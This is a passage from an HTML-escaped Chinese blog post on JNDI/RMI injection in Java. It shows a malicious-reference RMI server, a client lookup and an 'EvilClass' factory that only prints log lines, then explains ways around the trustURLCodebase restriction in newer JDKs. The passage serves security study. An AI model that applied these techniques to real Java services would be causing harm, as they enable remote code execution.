&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#111">reference&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EvilClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;EvilClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">factoryUrl&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ReferenceWrapper&lt;/span> &lt;span style="color:#111">wrapper&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ReferenceWrapper&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">reference&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">registry&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">bind&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">wrapper&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Server ready, factoryUrl:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">factoryUrl&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Server exception: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>客户端&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.InitialContext&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.NamingException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.directory.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Hashtable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">JNDILookup&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">ret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InitialContext&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">lookup&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;rmi://127.0.0.1:1099/Foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ret: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">ret&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">NamingException&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>恶意类&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.Context&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.Name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">javax.naming.spi.ObjectFactory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Hashtable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvilClass&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">ObjectFactory&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;EvilClass: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// do nothing
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">EvilClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;IIB block&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">EvilClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;static block&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">EvilClass&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">EvilClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;constructor&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getObjectInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Name&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">nameCtx&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Hashtable&lt;/span>&lt;span style="color:#f92672">&amp;lt;?,&lt;/span> &lt;span style="color:#f92672">?&amp;gt;&lt;/span> &lt;span style="color:#111">environment&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">EvilClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getObjectInstance&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行顺序&lt;/p>
&lt;pre tabindex="0">&lt;code>static在类加载的时候执行
代码块和无参构造方法在clas.newInstance()时执行
&lt;/code>&lt;/pre>&lt;h3 id="高版本">高版本&lt;/h3>
&lt;p>&lt;code>JDK 6u132&lt;/code>、&lt;code>7u122&lt;/code>、&lt;code>8u113&lt;/code> 开始 &lt;code>com.sun.jndi.rmi.object.trustURLCodebase&lt;/code> 默认值为&lt;code>false&lt;/code>，运行时需加入参数 &lt;code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=true&lt;/code> 。因为如果 &lt;code>JDK&lt;/code> 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 &lt;code>RMI&lt;/code> 代码&lt;/p>
&lt;p>深入代码中，问题出在高版本JDK中的&lt;code> com.sun.jndi.rmi.registry.RegistryContext#decodeObject&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://storage.tttang.com/media/attachment/2022/05/25/9c1c98e2-c3cd-48dd-bf2b-812e1e3176e8.png" alt="analysis1.png">&lt;/p>
&lt;p>其中 &lt;code>getFactoryClassLocation()&lt;/code>方法是获取&lt;code>classFactoryLocation&lt;/code>地址，可以看到，在 &lt;code>ref != null &amp;amp;&amp;amp; ref.getFactoryClassLocation() != null&lt;/code> 的情况下，会对 &lt;code>trustURLCodebase&lt;/code> 进行取反，由于在 &lt;code>JDK 6u132&lt;/code>、&lt;code>7u122&lt;/code>、&lt;code>8u113&lt;/code> 版本及以后， &lt;code>com.sun.jndi.rmi.object.trustURLCodebase&lt;/code> 默认为 &lt;code>false&lt;/code> ，所以会进入 &lt;code>if&lt;/code> 语句，抛出异常&lt;/p>
&lt;h4 id="绕过">绕过&lt;/h4>
&lt;p>如果要解码的对象 &lt;code>r&lt;/code> 是远程引用，就需要先解引用然后再调用 &lt;code>NamingManager.getObjectInstance&lt;/code>，其中会实例化对应的 &lt;code>ObjectFactory&lt;/code> 类并调用其 &lt;code>getObjectInstance&lt;/code> 方法，这也符合我们前面打印的 &lt;code>EvilClass&lt;/code> 的执行顺序&lt;/p>
&lt;p>为了绕过这里 &lt;code>ConfigurationException&lt;/code> 的限制，我们有三种思路&lt;/p>
&lt;ul>
&lt;li>令 &lt;code>trustURLCodebase&lt;/code> 为 &lt;code>true&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>在命令行指定 &lt;code>com.sun.jndi.rmi.object.trustURLCodebase&lt;/code> 参数，前面用过&lt;/p>
&lt;ul>
&lt;li>令 &lt;code>ref&lt;/code> 为空&lt;/li>
&lt;/ul>
&lt;p>从语义上看需要 &lt;code>obj&lt;/code> 既不是 &lt;code>Reference&lt;/code> 也不是 &lt;code>Referenceable&lt;/code>。即，不能是对象引用，只能是原始对象，这时候客户端直接实例化本地对象，远程 &lt;code>RMI&lt;/code> 没有操作的空间，因此这种情况不太好利用&lt;/p>
&lt;ul>
&lt;li>令 &lt;code>ref.getFactoryClassLocation()&lt;/code> 为空&lt;/li>
&lt;/ul>
&lt;p>让 &lt;code>ref&lt;/code> 对象的 &lt;code>classFactoryLocation&lt;/code> 属性为空，这个属性表示引用所指向对象的对应 &lt;code>factory&lt;/code> 名称，对于远程代码加载而言是 &lt;code>codebase&lt;/code>，即远程代码的 &lt;code>URL&lt;/code> 地址(可以是多个地址，以空格分隔)，这正是我们上文针对低版本的利用方法；如果对应的 &lt;code>factory&lt;/code> 是本地代码，则该值为空，这是绕过高版本 &lt;code>JDK&lt;/code> 限制的关键；&lt;/p>
&lt;p>为了满足这种方法，我们只需要在远程 &lt;code>RMI&lt;/code> 服务器返回的 &lt;code>Reference&lt;/code> 对象中不指定 &lt;code>Factory&lt;/code> 的 &lt;code>codebase&lt;/code>，接着看javax.naming.spi.NamingManager#getObejctInstance的解析过程&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">getObjectInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">refInfo&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Name&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Context&lt;/span> &lt;span style="color:#111">nameCtx&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Hashtable&lt;/span>&lt;span style="color:#f92672">&amp;lt;?,?&amp;gt;&lt;/span> &lt;span style="color:#111">environment&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectFactory&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Use builder if installed
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ObjectFactoryBuilder&lt;/span> &lt;span style="color:#111">builder&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getObjectFactoryBuilder&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">builder&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// builder must return non-null factory
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">factory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">builder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createObjectFactory&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">refInfo&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">environment&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getObjectInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">refInfo&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">nameCtx&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">environment&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Use reference if possible
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Reference&lt;/span> &lt;span style="color:#111">ref&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">refInfo&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ref&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Reference&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">refInfo&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">refInfo&lt;/span> &lt;span style="color:#00a8c8">instanceof&lt;/span> &lt;span style="color:#111">Referenceable&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ref&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">Referenceable&lt;/span>&lt;span style="color:#f92672">)(&lt;/span>&lt;span style="color:#111">refInfo&lt;/span>&lt;span style="color:#f92672">)).&lt;/span>&lt;span style="color:#75af00">getReference&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">answer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ref&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getFactoryClassName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// if reference identifies a factory, use exclusively
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">factory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getObjectFactoryFromReference&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">factory&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getObjectInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">nameCtx&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">environment&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// No factory found, so return original refInfo.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Will reach this point if factory class is not in
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// class path and reference does not contain a URL for it
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">refInfo&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
